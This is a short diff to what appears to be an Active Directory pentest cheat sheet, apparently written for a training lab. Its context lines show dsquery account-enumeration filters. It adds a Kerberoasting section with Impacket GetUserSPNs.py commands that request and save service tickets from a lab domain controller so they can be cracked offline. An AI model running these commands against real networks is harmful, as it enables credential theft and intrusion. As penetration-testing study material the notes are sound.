@@ -295,3 +295,10 @@ dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -
 
 dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr distinguishedName userAccountControl,description
 ```
+
+## Kerberoasting
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+```
